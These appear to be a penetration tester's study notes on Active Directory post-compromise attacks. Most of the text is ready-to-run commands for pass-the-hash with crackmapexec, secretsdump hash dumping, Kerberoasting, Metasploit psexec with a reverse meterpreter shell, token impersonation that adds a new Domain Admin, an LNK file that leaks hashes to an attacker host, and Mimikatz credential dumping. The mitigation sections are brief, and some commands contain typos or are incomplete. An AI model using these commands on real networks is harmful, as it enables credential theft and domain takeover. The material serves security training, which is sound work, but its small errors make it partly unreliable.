
# Pass attacks (pass password or hash)

If we crack a password or we can dump the SAM hashes we can leverage on them to perform lateral movments in the networks.


## crackmapexec
With the tool `crackmapexec` we can see if it is possible to move laterally on the network with the retrieved password.

We can run it in this way:
```bash
crackmapexec smb AD_NETWORK (10.0.0.0/24) -u username_we_have -d DOMAIN_AD -p password_we_have
```

*For example:*
- ![[Pasted image 20241218150113.png]]
- we can have access on 2 machines here with a single username and password


We can retrieve some hashes with the tool `secretdump.py`
We can run:
```bash
secretsdump.py DOMAIN/username:PASSWORD@HOST_IP
```
- ![[Pasted image 20241218150325.png]]


However we can use directly the hash if we cannot crack it:
```bash 
crackmapexec smb AD_NETWORK (10.0.0.0/24) -u username_we_have -d DOMAIN_AD -H hash_value --local-auth
```
- ![[Pasted image 20241218150643.png]]


To get all informations about the shares we can do:
```bash
crackmapexec smb AD_NETWORK (10.0.0.0/24) -u username_we_have -d DOMAIN_AD -H hash_value --local-auth --shares
```
- ![[Pasted image 20241218151253.png]]



One module really useful is `lsassy`, it is used to enforce the security policy on the system and stores some credentials so we could retrieve them:
```bash
crackmapexec smb AD_NETWORK (10.0.0.0/24) -u username_we_have -d DOMAIN_AD -H hash_value --local-auth -M lsassy
```
- ![[Pasted image 20241218151633.png]]



## Steps 
1. execute `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -p Password1`
	1. ![[Pasted image 20241220104858.png]]
	2. in case we have only the hash and not the password we need to run `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth`
2. then we can start to enumerate all information with `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth --sam ` to get other hashes
3. `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth --shares` to get other info about the the file sharing spaces
4. `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth -lsa` to get secret information
5. `crackmapexec smb NETWORK CIDR -u username -d DOMAIN -H HASH --local-auth -M lsassy` to get all stored information 


Crackmapexec stores everything in a database so we can retrieve the information using:
```bash
cmedb 

help
```


## dumbing and cracking hashes

What we can do is to run :
```bash 
secretsdump.py DOMAIN/username:'PASSWORD'@IP_HOST
```
- ![[Pasted image 20241220110911.png]]
- ![[Pasted image 20241220110942.png]]


## Pass attack mitigation
It is pretty hard to prevent but we can:
- force a limit account re-use
	- ![[Pasted image 20241220114503.png]]
- Utilize strong passwords
- use a Privilege Access Management (PAM)
	- ![[Pasted image 20241220114530.png]]



# Kerberoasting attack
This attacks leverages on a service account (example SQL Service)
- ![[Pasted image 20241220114715.png]]
- here we have an application server, when we have to access to it we need to ask for a ticket to the domain controller (TGT used to get a ticket to contact directly the server)
- once we have a TGT we need to request a TGS (to the domain controller) that is needed to access to the application server

The TGS is encrypted with the hash of the Application server.
- when we contact it the service will decrypt the ticket TGS and see if it is valid

So the idea here is to use the tool GetUserSPN to dump the Service server Hash value (contained in the TGS).

## Step 1: Dump hash with GET SPNs
Here we can use 
```bash
sudo pyhton GetUserSPNs.py DOMAIN/username:password -dc-ip IP_OF_DOMAIN_CONTROLLER -request
```
- ![[Pasted image 20241220120512.png]]
- ![[Pasted image 20241220120819.png]]

## Step 2: crack the hash with hashcat
We can crack the hash using hashcat:
```bash
hashcat -m 13100 hash.txt rockyout.txt
```



## Mitigation
The idea to mitigate this attack is:
- use strong passwords
- use least privilege (not run the service as domain admin)


# Token impersonation 
Tokens are temporary keys that allow access to system/network without providing credentials. 

There are two types of token  impersonation:
- Delegate, created for logging into a machine or using Remote Desktop
- Impersonate, "non interactive", so we create a script to attack network drive and so on




## Step 1 : use metasploit
We can use metasploit:
```bash
msfconsole

search psxexec

use 4 

set payload windows/x64/meterpreter/reverse_tcp

set rhosts VICTIM_IP

set smbuser username_leaked

set smbpass leaked_pass

set smbdomain DOMAIN

run

```

Now we have to load the Incognito mode into metasploit:
```bash
whoami (to see if it worked)

load incognito
```
- to work the user must be logged into the victim host
- `load + tab ` must show the alternatives

Now we can start to list tokens:
```bash
list_tokens -u
```
- `-g` to show groups instead users
- ![[Pasted image 20241220123122.png]]

At this point we can impersonate the token of a user:
```bash
impersonate_token DOMAIN\\username
```
- at this point we are impersonating it
- ![[Pasted image 20241220123205.png]]


Now with this we can obtain a shell:
```bash
shell
```


At this point we can add a new user to the Active Directory system:
```bash
net user /add username Password /domain
```
- `/domain` here must stay domain in lower 
- ![[Pasted image 20241220123605.png]]

At this point we need to add the new user in the admin group:
```bash
group "Domain Admins" username /ADD /DOMAIN
```
- `/DOMAIN` must remain DOMAIN
- ![[Pasted image 20241220123549.png]]


At this point we have the acess as admin to the AD.


Now we can test it on the terminal:
```bash
secretsdump.py DOMAIN/username:'PASSWORD'@DOMAIN_CONTROLLER_IP
```
- ![[Pasted image 20241220123720.png]]



## Mitigation
The idea to mitigate this attack is to:
- limit user/group token creation
- use account tiering 
- use local admin restriction

 
# LNK file attack

The idea is to store a file into shared folders in order to get some results.


The first way to do that is to create a file by our own with the using of **==elevated (admin) powershell==** (if we have access to the file share):
```powershell
$objShell = New-Object -ComObject WScript.shell 
$lnk = $objShell.CreateShortcut("C:\test.lnk") 
$lnk.TargetPath = "\\OUR_MACHINE_IP\@test.png" 
$lnk.WindowStyle = 1 
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3" 
$lnk.Description = "Test" 
$lnk.HotKey = "Ctrl+Alt+T" 
$lnk.Save()
```
- we create this `test.lnk` file that tries to resole a `png` file pointing back to our attack machine 
- the resolving will send us the request with the hashes
- this will save the file into `C` drive

So if we have a responder and the file is triggered then we can capture the hashes.

We can rename the file as:
```bash
@test
~test
```
- in order to force the visualization of it in the upper part of the folder


In the fileshare we have:
- ![[Pasted image 20241220144143.png]]


We setup a responder on the attacker machine:
```bash
sudo responder -I wlan0 -dPv
```


At this point when the user navigates the file share we will obtain data:
- ![[Pasted image 20241220144410.png]]



## netexec tool to automatize
Netexec is an evolution of crackmapexec that can be used to automatize:
```bash
netexec smb VICTIM_IP -d DOMAIN -u username -p Password -M slinky -o NAME=filename SERVER=ATTACKER_IP
```

It will create automatically the file into a file share space:
- ![[Pasted image 20241220144719.png]]


# GPP ATTACK
This is a older attack and it is done on the Group Policy Preferences that allowed admins to create policies using embendded credentials.

These credentials were encrypted and placed in a "cPassword".
- The key was acidentally released
- It was patched in MS14-025 but it doesn't prevemt previous uses

It still relevant.


So the idea is to have access to `Groups.xml` file in SYSVOL.

In this case we could find in it a cPassword and we can try to crack it:
- ![[Pasted image 20241220145119.png]]


We can also use ==**metasploit to do this type of attack with the module**== `smb_enum_GPP`:
- ![[Pasted image 20241220145327.png]]


## Mitigation
We can fix it in this way:
- Use the patch and update
- delete the old GPP xml file stored in SYSVOL


# Mimikatz attack
This is a tool generally used to view and steal credentials, to generate Kerberos tickets and to do attacks.

It can dump credentials stored in memory and can do some attacks like:
- cred dumping
- pass the hash
- over pass the hash
- pass the tickets 
- silver ticket and gold ticket attacks


It can be detected from antivirus so we have to obfuscate it.



## credential dumping with minikatz

First of all we need to get it from github [https://github.com/ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

We download the release and we go to `x64` folder in it and extract the files:
- ![[Pasted image 20241220150414.png]]

The idea is that we need to put these files into a machine in the Active Directory system.

On the attacker we can run:
```bash
python3 -m http.server 80
```

And then get it from the windows machine:
- ![[Pasted image 20241220150602.png]]


Now on the windows victim we open the command prompt and run it as admin and go in the folder:
```bash
c:\users\username\folder_file

minikatz.exe
```

At this point we set the privileges to debug:
```bash
privilege::debug
```

Now we can run attacks.

## sekurlsa attack
We can run:
```bash
sekurlsa::
```
- to see all alternatives
- ![[Pasted image 20241220151125.png]]

*For example*:
```bash
sekurlsa::logonPasswords
```
- shows all credentials that can be retrieved on the host we are executing it
- ![[Pasted image 20241220151254.png]]


It could be possible to get cleartext password if we perform previously LNK attacks, when it tries to link the file:
- ![[Pasted image 20241220151455.png]]



# POST COMPROMISE ATTACK STRATEGY SUMMARY

We have an account, so we can do now?
![[Pasted image 20241220151635.png]]

